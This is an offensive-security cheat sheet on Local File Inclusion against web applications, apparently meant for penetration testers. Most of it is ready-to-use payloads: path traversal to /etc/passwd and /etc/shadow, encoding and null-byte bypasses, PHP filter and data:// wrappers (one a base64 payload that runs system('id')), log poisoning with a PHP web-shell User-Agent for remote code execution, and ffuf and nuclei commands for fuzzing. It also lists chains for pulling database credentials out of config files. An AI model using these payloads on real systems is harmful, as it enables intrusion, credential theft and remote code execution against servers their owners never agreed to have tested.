# LFI Techniques

> Local File Inclusion — forcing a server to include or read arbitrary local files, leaking source code, credentials, or enabling code execution via log poisoning.

## Surface

- File path params: `?page=about`, `?template=home`, `?file=report.pdf`, `?lang=en`
- Download/export endpoints: `/download?path=`, `/export?filename=`
- Log viewing or debug features: `?log=access`, `?debug=1&file=`
- Image/avatar serving routes that map user input to filesystem paths
- PHP `include()`, `require()`, `include_once()` with unsanitized input
- Blind oracle: app behavior changes (error vs. no error) when file exists vs. not

## Test Approach

1. **Basic traversal** — start with `../` sequences, count directory depth:
   ```
   ?page=../../../../etc/passwd
   ?file=....//....//....//etc/passwd
   ```
2. **Null byte / encoding bypasses**:
   ```
   ?page=../../../etc/passwd%00
   ?page=..%252f..%252f..%252fetc/passwd   # double-encode
   ?page=....\/....\/etc/passwd            # mixed slashes
   ```
3. **PHP wrappers** — test for PHP-specific extension tricks:
   ```
   ?page=php://filter/convert.base64-encode/resource=index.php
   ?page=php://input  (POST body as PHP code)
   ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
   ```
4. **Log poisoning → RCE** — inject PHP into User-Agent, then include log:
   ```
   User-Agent: <?php system($_GET['cmd']); ?>
   GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
   ```
5. **Blind file oracle** — probe for file existence via timing or error differences:
   ```
   ffuf -u "https://target.com/download?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -mr "root:" -t 30
   ```
6. **Windows targets** — use backslash and drive letters:
   ```
   ?file=..\..\..\..\windows\win.ini
   ?file=C:\inetpub\wwwroot\web.config
   ```

## Tools

- **ffuf** — path traversal wordlist fuzzing with match on known file strings
- **LFISuite** — automated LFI detection and exploitation
- **nuclei** — LFI templates: `nuclei -t lfi/ -u https://target.com`
- **Burp Intruder** — systematic encoding variant testing (none, URL, double-URL, null byte)

## Payloads / Probes

```
# Linux file targets
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../proc/self/fd/0
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=../config.php
expect://id

# Windows targets
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..\..\..\xampp\htdocs\config.php

# Encoding bypasses
....//....//etc/passwd
..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## Chain Opportunities

- **LFI → RCE** — log poisoning via User-Agent or SSH key injection, then include log
- **LFI → source disclosure → further vulns** — read `config.php` for DB creds, API keys
- **LFI + PHP wrapper → RCE** — `php://input` or `data://` if `allow_url_include=On`
- **LFI → /proc/self/environ** — inject PHP in env vars (HTTP_USER_AGENT), include environ

## Recent Intel

- **Flarum blind file oracle** · Unauthenticated blind LFI via file path param in forum software — file existence oracle via differential response · https://www.assetnote.io/resources/research/leaking-file-contents-with-a-blind-file-oracle-in-flarum
- **PHP filter chain RCE** · `php://filter` chains can generate arbitrary PHP strings without a file — enables RCE even without log poisoning · https://www.ambionics.io/blog/php-filter-chains-file-read-to-rce
- **CVE-2021-41773** · Apache path traversal + LFI → RCE in Apache 2.4.49/50, `%2e%2e%2f` bypass in `mod_cgi` — patched but still seen in the wild
